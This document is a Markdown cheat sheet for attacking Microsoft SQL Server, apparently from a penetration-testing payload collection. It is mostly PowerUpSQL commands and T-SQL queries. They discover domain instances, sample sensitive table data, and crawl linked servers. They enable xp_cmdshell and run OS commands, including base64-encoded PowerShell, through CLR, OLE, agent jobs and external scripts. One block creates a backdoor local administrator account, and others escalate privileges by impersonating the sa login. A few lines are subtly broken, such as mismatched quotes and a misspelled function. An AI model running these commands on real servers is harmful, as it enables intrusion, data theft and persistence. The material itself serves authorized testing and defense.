# MSSQL Server

## Summary

* [Identify Instances and Databases](#identifiy-instaces-and-databases)
	* [Discover Local SQL Server Instances](#discover-local-sql-server-instances)
	* [Discover Domain SQL Server Instances](#discover-domain-sql-server-instances)
    * [Discover Remote SQL Server Instances](#discover-remote-sql-instances)
	* [Identify Encrypted databases](#identifiy-encrypted-databases) 
	* [Version Query](#version-query)
* [Identify Sensitive Information](#identify-sensitive-information)
	* [Get Tables from a Specific Database](#get-tables-from-specific-databases)
	* [Gather 5 Entries from Each Column](#gather-5-entries-from-each-column)
	* [Gather 5 Entries from a Specific Table](#gather-5-entries-from-a-specific-table)
    * [Dump common information from server to files](#dump-common-information-from-server-to-files)
* [Linked Database](#linked-database)
	* [Crawl Links for Instances in the Domain](#crawl-links-for-instances-in-the-domain) 
	* [Crawl Links for a Specific Instance](#crawl-links-for-a-specific-instance)
	* [Query Version of Linked Database](#query-version-of-linked-database)
	* [Execute Procedure on Linked Database](#execute-procedure-on-linked-database)
	* [Determine Names of Linked Databases ](#determine-names-of-linked-databases)
	* [Determine All the Tables Names from a Selected Linked Database](#determine-all-the-tables-names-from-a-selected-linked-database)
	* [Gather the Top 5 Columns from a Selected Linked Table](#gather-the-top-5-columns-from-a-selected-linked-table)
	* [Gather Entries from a Selected Linked Column](#gather-entries-from-a-selected-linked-column)
	* [Command Execution via xp_cmdshell](#command-execution-via-xp_cmdshell)
* [Extended Stored Procedure](#extended-stored-procedure)
	* [Add the extended stored procedure and list extended stored procedures](#add-the-extended-stored-procedure-and-list-extended-stored-procedures)
* [CLR Assemblies](#clr-assemblies)
	* [Execute commands using CLR assembly](#execute-commands-using-clr-assembly)
* [OLE Automation](#ole-automation)
	* [Execute commands using OLE automation procedures](#execute-commands-using-ole-automation-procedures)
* [Agent Jobs](#agent-jobs)
	* [Execute commands through SQL Agent Job service](#execute-commands-through-sql-agent-job-service)
	* [List All Jobs](#list-all-jobs)
* [External Scripts](#external-scripts)
    * [Python](#python)
    * [R](#r)
* [Audit Checks](#audit-checks)
	* [Find and exploit impersonation opportunities](#find-and-explit-impersonation-opportunities) 
* [Find databases that have been configured as trustworthy](#find-databases-that-have-been-configured-as-trustworthy)
* [Manual SQL Server Queries](#manual-sql-server-queries)
	* [Query Current User & determine if the user is a sysadmin](#query-current-user--determine-if-the-user-is-a-sysadmin)
	* [Current Role](#current-role)
	* [Current DB](#current-db)
	* [List all tables](#list-all-tables)
	* [List all databases](#list-all-databases)
	* [All Logins on Server](#all-logins-on-server)
	* [All Database Users for a Database](#all-database-users-for-a-database) 
	* [List All Sysadmins](#list-all-sysadmins)
	* [List All Database Roles](#list-all-database-role)
	* [Effective Permissions from the Server](#effective-permissions-from-the-server)
	* [Effective Permissions from the Database](#effective-permissions-from-the-database)
	* [Find SQL Server Logins Which can be Impersonated for the Current Database](#find-sql-server-logins-which-can-be-impersonated-for-the-current-database)
	* [Exploiting Impersonation](#exploiting-impersonation)
	* [Exploiting Nested Impersonation](#exploiting-nested-impersonation)
* [References](#references)

## Identify Instances and Databases

### Discover Local SQL Server Instances

```ps1
Get-SQLInstanceLocal
```

### Discover Domain SQL Server Instances

```ps1
Get-SQLInstanceDomain -Verbose
# Get Server Info for Found Instances
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
# Get Database Names
Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults
```

### Discover Remote SQL Server Instances

```ps1
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
```

### Identify Encrypted databases 
Note: These are automatically decrypted for admins


```ps1
Get-SQLDatabase -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Verbose | Where-Object {$_.is_encrypted -eq "True"}
```

### Version Query

```ps1
Get-SQLInstanceDomain | Get-Query "select @@version"
```

## Identify Sensitive Information

### Get Tables from a Specific Database

```ps1
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName <DBNameFromGet-SQLDatabaseCommand> -NoDefaults
Get Column Details from a Table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName <DBName> -TableName <TableName>
```


### Gather 5 Entries from Each Column


```ps1
Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "<columnname1,columnname2,columnname3,columnname4,columnname5>" -Verbose -SampleSize 5
```

### Gather 5 Entries from a Specific Table


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query 'select TOP 5 * from <DatabaseName>.dbo.<TableName>'
```


### Dump common information from server to files

```ps1
Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
```

## Linked Database

### Crawl Links for Instances in the Domain 
A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results


```ps1
Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
```

### Crawl Links for a Specific Instance

```ps1
Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

### Query Version of Linked Database


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DBSERVERNAME\DBInstance>`",'select @@version')" -Verbose
```

### Execute Procedure on Linked Database

```ps1
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```

### Determine Names of Linked Databases 

> tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from sys.databases')" -Verbose
```

### Determine All the Tables Names from a Selected Linked Database

> The result is TableName which feeds into following query


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')" -Verbose
```

### Gather the Top 5 Columns from a Selected Linked Table

> The results are ColumnName and ColumnValue which feed into following query


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select TOP 5 * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand>')" -Verbose
```

### Gather Entries from a Selected Linked Column


```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')" -Verbose
```


### Command Execution via xp_cmdshell

> xp_cmdshell disabled by default since SQL Server 2005

```ps1
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami
Creates and adds local user backup to the local administrators group:
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add' -Verbose
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
```

## Extended Stored Procedure

### Add the extended stored procedure and list extended stored procedures

```ps1
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

## CLR Assemblies

### Execute commands using CLR assembly

```ps1
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
or
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose
```


## OLE Automation

### Execute commands using OLE automation procedures

```ps1
Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
```

## Agent Jobs

### Execute commands through SQL Agent Job service

```ps1
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell e <base64encodedscript>" -Verbose
Subsystem Options:
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
```

### List All Jobs

```ps1
Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Password1234 -Verbose
```

## External Scripts

## Python:

```ps1
Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose
```

## R

```ps1
Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose
```

## Audit Checks


### Find and exploit impersonation opportunities 

```ps1
Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose

# impersonate sa account
powerpick Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
```

## Find databases that have been configured as trustworthy

```ps1
Invoke-SQLAuditPrivTrustworthy -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose 
```

> The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.

```ps1
Invoke-SQLAuditPrivXpDirtree
Invoke-SQLUncPathInjection
Invoke-SQLAuditPrivXpFileexist
```

## Manual SQL Server Queries

### Query Current User & determine if the user is a sysadmin

```sql
select suser_sname()
Select system_user
select is_srvrolemember('sysadmin')
```

### Current Role

```sql
Select user
```

### Current DB

```sql
select db_name()
```

### List all tables

```sql
select table_name from information_schema.tables
```

### List all databases

```sql
select name from master..sysdatabases
```

### All Logins on Server 

```sql
Select * from sys.server_principals where type_desc != 'SERVER_ROLE'
```

### All Database Users for a Database 

```sql
Select * from sys.database_principals where type_desc != 'database_role';
```

### List All Sysadmins

```sql
SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1
```

### List All Database Roles

```sql
SELECT DB1.name AS DatabaseRoleName,
isnull (DB2.name, 'No members') AS DatabaseUserName
FROM sys.database_role_members AS DRM
RIGHT OUTER JOIN sys.database_principals AS DB1
ON DRM.role_principal_id = DB1.principal_id
LEFT OUTER JOIN sys.database_principals AS DB2
ON DRM.member_principal_id = DB2.principal_id
WHERE DB1.type = 'R'
ORDER BY DB1.name;
```

### Effective Permissions from the Server

```sql
select * from fn_my_permissions(null, 'server');
```

### Effective Permissions from the Database

```sql
SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');
```

### Find SQL Server Logins Which can be Impersonated for the Current Database

```sql
select distinct b.name
from sys.server_permissions a
inner join sys.server_principals b
on a.grantor_principal_id = b.principal_id
where a.permission_name = 'impersonate'
```

### Exploiting Impersonation

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'adminuser'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```

### Exploiting Nested Impersonation

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
```

## References

* [PowerUpSQL Cheat Sheet & SQL Server Queries - Leo Pitt](https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3)
* [PowerUpSQL Cheat Sheet - Scott Sutherland](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)